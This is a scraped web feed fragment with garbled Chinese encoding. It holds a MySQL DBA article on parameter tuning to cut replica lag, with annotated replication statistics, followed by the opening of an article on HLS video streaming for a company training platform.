  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:16:18.000Z" title="Thu Jan 08 2026 03:16:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œè€…ï¼šå­™ç»ªå®—ï¼Œæ–°æµªå¾®åš DBA å›¢é˜Ÿå·¥ç¨‹å¸ˆï¼Œä¸»è¦è´Ÿè´£ MySQLã€PostgreSQL ç­‰å…³ç³»å‹æ•°æ®åº“è¿ç»´ã€‚</p>
<p>çˆ±å¯ç”Ÿå¼€æºç¤¾åŒºå‡ºå“ï¼ŒåŸåˆ›å†…å®¹æœªç»æˆæƒä¸å¾—éšæ„ä½¿ç”¨ï¼Œè½¬è½½è¯·è”ç³»å°ç¼–å¹¶æ³¨æ˜æ¥æºã€‚</p>
<p>æœ¬æ–‡çº¦ 1000 å­—ï¼Œé¢„è®¡é˜…è¯»éœ€è¦ 3 åˆ†é’Ÿã€‚</p>
</blockquote>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨æ•°æ®åº“è¿ç»´è¿‡ç¨‹ä¸­ï¼Œæ— è®ºæ˜¯è¿ç§»æ‰©å®¹è¿˜æ˜¯ç”Ÿäº§æŠ•é‡ï¼Œéƒ½å¿…ä¸å¯å°‘çš„ä¼šé‡åˆ°ä»åº“è¿ç§»è¿½ä¸ä¸Šçš„é—®é¢˜ã€‚è¿™äº›é—®é¢˜ä»¤äººå¤´ç–¼ã€‚</p>
<p>ä»¥ä¸‹åˆ—ä¸¾å‡ ä¸ªæˆ‘ä¸ªäººé‡åˆ°è¿‡çš„åŸå› ï¼š</p>
<ul>
<li><code>buffer_pool</code> è®¾ç½®è¿‡å¤§ï¼Œå¯¼è‡´ MySQL ä½¿ç”¨ SWAP</li>
<li>å¤‡ä»½å¯¼è‡´ SQL_THREAD å›æ”¾ç­‰å¾… MDL</li>
<li>å¤§äº‹åŠ¡</li>
<li>æ…¢æŸ¥è¯¢å¯¼è‡´ä»åº“æ€§èƒ½ä½ä¸‹</li>
<li>å¹¶è¡Œå¤åˆ¶å¯¼è‡´ä»åº“å»¶è¿Ÿç›‘æ§ä¸€ç›´ä¸º 1s</li>
<li>ç½‘ç»œé—®é¢˜</li>
</ul>
<p><em>å…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼Œè¿™é‡Œä¸èµ˜è¿°ã€‚</em></p>
<p>å¦‚æœä½ åœ¨å¸¸è§„æ’æŸ¥ä¹‹åï¼Œä¾ç„¶æ— æ³•è§£å†³ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘å°†æ ¹æ®è‡ªèº«çš„ä¸€äº›ç»éªŒï¼Œæä¾›ä¸€äº›å‚æ•°è°ƒæ•´æ€è·¯ï¼Œä¾›å¤§å®¶å‚è€ƒã€‚</p>
<h2 data-id="heading-1">æ€è·¯ä¸€ï¼šsync ç›¸å…³</h2>
<p>æˆ‘ä»¬åœ¨è¿½å»¶è¿Ÿçš„æƒ…å†µï¼Œå¯ä»¥è°ƒæ•´ä¸€ä¸‹å‚æ•°ï¼Œå¢åŠ æ—¥å¿—è½ç›˜æ•ˆç‡ã€‚åç»­ä¸Šçº¿ä»åº“å¯ä»¥å†è®¾ç½®å›æ¥ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">sync_binlog</span>=<span class="hljs-number">0</span>
<span class="hljs-attr">sync_master_info</span>=<span class="hljs-number">10000</span> <span class="hljs-comment">#default</span>
<span class="hljs-attr">sync_relay_log</span>=<span class="hljs-number">10000</span> <span class="hljs-comment">#default</span>
<span class="hljs-attr">sync_relay_log_info</span>=<span class="hljs-number">10000</span> <span class="hljs-comment">#default</span>
</code></pre>
<h2 data-id="heading-2">æ€è·¯äºŒï¼šbuffer å’Œå¹¶å‘ç­‰ç›¸å…³</h2>
<p>å¯ä»¥è€ƒè™‘å¢åŠ ä¸€ä¸‹ <code>buffer_pool</code>ï¼ŒSQL_THREAD å›æ”¾æ‰§è¡Œçš„æ›´å¿«ã€‚</p>
<p>å¦‚æœå†…å­˜ç©ºé—´ä¸è¶³çš„è¯ï¼Œå¯ä»¥é€‚å½“è°ƒæ•´ <code>change buffer</code> çš„æ¯”ä¾‹ï¼ˆå‰ææ˜¯æ— è¯»ï¼Œæ­£å¸¸æƒ…å†µä¸‹å»¶è¿Ÿåº“å‡ä¸ºæ— ä¸šåŠ¡è¿æ¥ï¼‰ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">innodb_buffer_pool_size</span>=<span class="hljs-number">24</span>G <span class="hljs-comment">#24*1024*1024*1024</span>
<span class="hljs-attr">innodb_change_buffer_max_size</span>=<span class="hljs-number">50</span>
<span class="hljs-attr">innodb_thread_concurrency</span>=<span class="hljs-number">0</span>
<span class="hljs-attr">innodb_adaptive_hash_index</span>=<span class="hljs-number">0</span>
</code></pre>
<p>å¢å¤§ <code>innodb_buffer_pool_size</code> é£é™©ç‚¹ï¼š</p>
<ol>
<li>å†…å­˜è¿‡åº¦åˆ†é…å¯¼è‡´ SWAP è§¦å‘æˆ– OOMï¼Œéœ€é¢„ç•™è¶³å¤Ÿå†…å­˜ç»™ç³»ç»Ÿå’Œ MySQL å…¶ä»–ç»„ä»¶ï¼Œå»ºè®®ç¼“å†²æ± ä¸è¶…è¿‡ç‰©ç†å†…å­˜çš„ 70%ï¼›</li>
<li>è°ƒæ•´éœ€åˆ†æ­¥è¿›è¡Œï¼Œç»“åˆç³»ç»Ÿå†…å­˜ç›‘æ§ï¼Œé¿å…ä¸€æ¬¡æ€§è®¾ç½®è¿‡å¤§ã€‚</li>
</ol>
<h2 data-id="heading-3">æ€è·¯ä¸‰ï¼šslave ç›¸å…³</h2>
<h3 data-id="heading-4">è€ƒè™‘å¼€å¯å¹¶è¡Œå¤åˆ¶</h3>
<p>å¼€å¯å¹¶è¡Œå¤åˆ¶ï¼Œ8.0+ ç‰ˆæœ¬è€ƒè™‘ç”¨ writesetã€‚å¤åˆ¶çº¿ç¨‹å¯ä»¥å¤šè§‚å¯Ÿä¸€ä¸‹ï¼Œå¦‚æœæ²¡å¤Ÿçš„è¯ï¼Œå¯ä»¥è€ƒè™‘å¢åŠ ã€‚ä½†ä¸å»ºè®®è¶…è¿‡ CPU æ ¸å¿ƒæ•°æˆ–è€… <code>innodb_thread_concurrency</code> å‚æ•°å€¼ã€‚</p>
<p><code>slave_preserve_commit_order</code> ä¼šåŠ ä¸€å±‚é”ï¼Œè¿½å»¶è¿Ÿçš„æ—¶å€™å»ºè®®å…³é—­ï¼Œåç»­ä¸Šçº¿ä»åº“å¯ä»¥å†æ‰“å¼€ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">slave_parallel_type</span>=LOGICAL_CLOCK
<span class="hljs-attr">slave_parallel_workers</span>=<span class="hljs-number">16</span>
<span class="hljs-attr">slave_preserve_commit_order</span>=<span class="hljs-literal">OFF</span>
</code></pre>
<p><strong>ä¸ªäººä¸å»ºè®®ä¿®æ”¹ä»¥ä¸‹å‚æ•°</strong>ï¼Œæ€§èƒ½è™½ç„¶ä¼šæœ‰æ‰€å¢é•¿ï¼Œä½†åŒæ—¶ä¼šå¯¼è‡´ä¸»åº“ <code>commit</code> ç­‰å¾…ã€‚å½“ç„¶éƒ¨åˆ†éå®æ—¶ç±»ä¸šåŠ¡å¯ä»¥è°ƒæ•´ã€‚</p>
<p>binlog çš„ç»„æäº¤çš„ä¸¤ä¸ªæœ‰å…³å‚æ•°ï¼š</p>
<ul>
<li><code>binlog_group_commit_sync_delay</code> å‚æ•°ï¼Œè¡¨ç¤ºå»¶è¿Ÿå¤šå°‘å¾®ç§’åæ‰è°ƒç”¨ fsync åˆ·ç›˜ï¼›</li>
<li><code>binlog_group_commit_sync_no_delay_count</code> å‚æ•°ï¼Œè¡¨ç¤ºç´¯ç§¯å¤šå°‘æ¬¡ä»¥åæ‰è°ƒç”¨ fsyncã€‚</li>
</ul>
<h3 data-id="heading-5">è€ƒè™‘å…³é—­ log_slave_updates</h3>
<p><code>log_slave_updates</code> è¿™ä¸ªéœ€è¦é‡å¯ç”Ÿæ•ˆã€‚ä½†æ˜¯æœ‰ gdb ç»éªŒçš„å°ä¼™ä¼´å¯ä»¥ gdb ä¿®æ”¹ï¼Œä¸éœ€è¦é‡å¯ï¼Œåªéœ€è¦é‡å¯ slave å¤åˆ¶å³å¯ç”Ÿæ•ˆã€‚æ—  gdb ç»éªŒå¯èƒ½ä¼šå¯¼è‡´ crash ä¸å»ºè®®ã€‚</p>
<p>åŒæ—¶æ³¨æ„éœ€è¦äº†è§£æ¶æ„ï¼Œæ²¡æœ‰ binlog å¤‡ä»½æˆ–è€…çº§è”åº“ï¼Œä¸”æ— ä¸šåŠ¡è¿æ¥ï¼Œå»ºè®®å¯ä»¥å…³é—­ã€‚</p>
<h2 data-id="heading-6">æ€è·¯å››</h2>
<p>MGR æ¶æ„å¯ä»¥è€ƒè™‘å…ˆæ”¹ä¸ºå¼‚æ­¥å¤åˆ¶ï¼Œå…³é—­ <code>slave_preserve_commit_order</code>ï¼Œå¾…å»¶è¿Ÿè¿½å®Œåå†åŠ å…¥åˆ°é›†ç¾¤ã€‚</p>
<h2 data-id="heading-7">æ€è·¯äº”</h2>
<p>å…¶ä»–æ€§èƒ½å‚æ•°æŒ‰ç…§æ¨¡æ¿ç†è®ºä¸Šä¸ä¼šæœ‰å¤ªå¤§é—®é¢˜ï¼Œè¿™å¥—æ“ä½œä¸‹æ¥å»¶è¿Ÿå¤§æ¦‚ç‡ä¼šæœ‰æ‰€ä¸‹é™ï¼Œé™ä¸º 0 åªæ˜¯æ—¶é—´é—®é¢˜ã€‚</p>
<h2 data-id="heading-8">é™„å½•</h2>
<p>å¹¶è¡Œå¤åˆ¶ç§¯å‹æ—¥å¿—è§£æ:</p>
<pre><code class="hljs language-ini" lang="ini">2021-01-10T16:08:39.947611+08:00 85441 <span class="hljs-section">[Note]</span> Multi-threaded slave statistics for channel ''<span class="hljs-comment">;seconds elapsed = 120;events assigned = 4005889;worker queues filled over overrun level = 0;waited due a Worker queue full = 0;waited due the total size = 0;waited at clock conflicts = 6918018179200 waited (count) when Workers occupied = 0 waited when Workers occupied = 0</span>
--------------------------------
Multi-threaded slave statistics for channel â€:
seconds <span class="hljs-attr">elapsed</span> = <span class="hljs-number">120</span><span class="hljs-comment">; æ¯éš”120sè¾“å‡º</span>
<span class="hljs-attr">eventsassigned</span> = <span class="hljs-number">4005889</span><span class="hljs-comment">; æ€»å…±æœ‰å¤šå°‘ä¸ªeventè¢«åˆ†é…æ‰§è¡Œ</span>
queues filled over overrun <span class="hljs-attr">level</span> = <span class="hljs-number">0</span><span class="hljs-comment">; å¤šçº¿ç¨‹åŒæ­¥ä¸­ï¼Œworker çš„ç§æœ‰é˜Ÿåˆ—é•¿åº¦è¶…é•¿çš„æ¬¡æ•°</span>
waited due aWorker queue <span class="hljs-attr">full</span> = <span class="hljs-number">0</span><span class="hljs-comment">; å› ä¸ºworkerçš„é˜Ÿåˆ—è¶…é•¿è€Œäº§ç”Ÿç­‰å¾…çš„æ¬¡æ•°</span>
waited due the total <span class="hljs-attr">size</span> = <span class="hljs-number">0</span><span class="hljs-comment">; è¶…è¿‡æœ€å¤§sizeçš„æ¬¡æ•°</span>
waited at clock <span class="hljs-attr">conflicts</span>= <span class="hljs-number">6918018179200</span><span class="hljs-comment">;å› ä¸ºé€»è¾‘æ—¶é—´äº§ç”Ÿå†²çªçš„ç­‰å¾…æ—¶é—´ï¼Œå•ä½æ˜¯çº³ç§’</span>
waited (count) when Workers <span class="hljs-attr">occupied</span> = <span class="hljs-number">0</span> å› ä¸ºworkderè¢«å ç”¨è€Œå‡ºç°ç­‰å¾…çš„æ¬¡æ•°ã€‚ï¼ˆæ€»è®¡å€¼ï¼‰
waited when Workers <span class="hljs-attr">occupied</span> = <span class="hljs-number">0</span> å› ä¸ºworkderè¢«å ç”¨è€Œå‡ºç°ç­‰å¾…çš„æ€»æ—¶é—´ï¼Œæ€»è®¡å€¼ï¼Œå•ä½æ˜¯çº³ç§’
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HLS æµåª’ä½“æŠ€æœ¯ï¼šç•…äº«é«˜æ¸…è§†é¢‘ï¼Œå¿˜å´ MP4 å¡é¡¿çš„çƒ¦æ¼ï¼]]></title>    <link>https://juejin.cn/post/7592540388297900095</link>    <guid>https://juejin.cn/post/7592540388297900095</guid>    <pubDate>2026-01-08T03:16:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592540388297900095" data-draft-id="7592410399918374953" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HLS æµåª’ä½“æŠ€æœ¯ï¼šç•…äº«é«˜æ¸…è§†é¢‘ï¼Œå¿˜å´ MP4 å¡é¡¿çš„çƒ¦æ¼ï¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:16:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/606586148237431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HLS æµåª’ä½“æŠ€æœ¯ï¼šç•…äº«é«˜æ¸…è§†é¢‘ï¼Œå¿˜å´ MP4 å¡é¡¿çš„çƒ¦æ¼ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586148237431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:16:49.000Z" title="Thu Jan 08 2026 03:16:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨è½¬è½¬å­¦å ‚è¿™ä¸ªå­¦ä¹ å¹³å°ä¸­ï¼Œæä¾›äº†ä¸Šé—¨ã€é—¨åº—å’Œè´¨æ£€ä¸­å¿ƒç­‰åŸ¹è®­è§†é¢‘è¯¾ç¨‹ï¼Œæ»¡è¶³äº†å„ä¸šåŠ¡éœ€æ±‚ã€‚ä½œä¸ºå…¨ä½“å‘˜å·¥å­¦ä¹ çš„ä¸»è¦æ¸ é“ä¹‹ä¸€ï¼Œå¹³å°æ¶‰åŠäº†è¶…è¿‡ 3000 äººï¼Œå¤§å¤šæ•°ä¸šåŠ¡ç›¸å…³çš„è§†é¢‘è¯¾ç¨‹éƒ½å°†åœ¨è¯¥å¹³å°ä¸Šè¿›è¡Œå­¦ä¹ ï¼Œå› æ­¤è¯¥å¹³å°çš„è§†é¢‘æ’­æ”¾ä½“éªŒé—®é¢˜ä¹Ÿè‡³å…³é‡è¦ã€‚</p>
<p>è¿‡å»æ²¡æœ‰ä¸“é—¨æŠ½ç©ºå»æ¢³ç†ï¼Œä»Šå¤©åˆšå¥½æœ‰æœºä¼šï¼Œå›é¡¾è¿‡å»åŠæ¢³ç†ä¸€ä¸‹è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹ã€‚æ¥ä¸‹æ¥ï¼Œè®²ä¸€ä¸‹æˆ‘ä»¬åœ¨è§†é¢‘æ’­æ”¾ä¸Šé‡åˆ°çš„é—®é¢˜åŠå¦‚ä½•ä¸€æ­¥æ­¥è§£å†³çš„ã€‚</p>
<h2 data-id="heading-1">è¿‡å»é—®é¢˜</h2>
<p>åœ¨å­¦å ‚ä¸Šçº¿ä¹‹åï¼Œæ—¶ä¸æ—¶æœ‰äººåé¦ˆè§†é¢‘æ’­æ”¾æ¯”è¾ƒå¡ã€‚èµ·åˆï¼Œæˆ‘ä»¬è§‰çš„è¿™ä¸ªå¡é¡¿è·Ÿæˆ‘ä»¬æ²¡å¤ªå¤šå…³ç³»ï¼Œç”¨çš„æ’­æ”¾å™¨éƒ½æ˜¯æµè§ˆå™¨å†…ç½®çš„ï¼Œæ²¡åŠæ³•å¹²æ¶‰åˆ°åº•å±‚çš„èƒ½åŠ›ã€‚å†åæ¥ï¼Œåé¦ˆçš„æƒ…å†µè¶Šæ¥è¶Šå¤šï¼Œä¸å¾—ä¸é‡è§†èµ·æ¥ï¼Œä»¥ä¸‹æ˜¯è¿‡å»æ”¶é›†åˆ°çš„åé¦ˆä¿¡æ¯ï¼š</p>
<blockquote>
<p>é»„æŸ 1ï¼šåˆšæ‰è¿˜æœ‰ä¸šåŠ¡æ‰¾æˆ‘è¯´è§†é¢‘å¡é¡¿ã€‚<br/>
é»„æŸ 1ï¼šå­¦å ‚çš„è§†é¢‘ä»Šå¤©å‡ºç°å¡é¡¿çš„æƒ…å†µã€‚<br/>
ææŸï¼šè¿™ä¸ªä¼˜åŒ–æ—¶é—´å¤§æ¦‚å¤šä¹…å‘€ï¼Œç›®å‰è¯¾ç¨‹éƒ½ä»¥å¼€æ”¾ä½¿ç”¨ï¼Œå¡é¡¿ä¼šå½±å“æŒºå¤šä¸šåŠ¡ä½¿ç”¨çš„å“¦ã€‚<br/>
é»„æŸ 2ï¼šå¤§ä½¬ä»¬ï¼Œæƒ³é—®ä¸‹å­¦å ‚å¡é¡¿çš„é—®é¢˜ç°åœ¨æ˜¯å¦ä¼˜åŒ–äº†ï¼Œæˆ‘ä»¬è€æ¿ä»Šå¤©åˆ°å­¦å ‚ä½“éªŒçš„æ—¶å€™å‘ç°å¡é¡¿é—®é¢˜è¿˜æ˜¯å­˜åœ¨ï¼Œè¾›è‹¦å…³æ³¨ä¸‹ã€‚<br/>
äº§å“ 1ï¼šç°åœ¨è´¨æ£€çš„åœ¨ç”¨æˆ‘ä»¬çš„è§†é¢‘å­¦ä¹ ï¼Œä»–ä»¬åé¦ˆè§†é¢‘å¾ˆå¡ï¼Œå¾ˆå½±å“ä»–ä»¬çš„å­¦ä¹ æ•ˆç‡ã€‚</p>
</blockquote>
<p>è¿™æ— ç–‘ä¹Ÿç»™äºˆäº†æˆ‘ä»¬ä¸€äº›å‹åŠ›ï¼Œä¸å¤„ç†å¥½è¿™ä¸ªäº‹æƒ…çš„è¯ï¼Œåç»­æ›´å¤šäººç”¨çš„è¯ï¼Œåæ§½çš„ä¼šæ›´å¤šï¼Œæˆ‘ä»¬ä¹Ÿä¼šæ›´éš¾å ªã€‚ğŸ˜£</p>
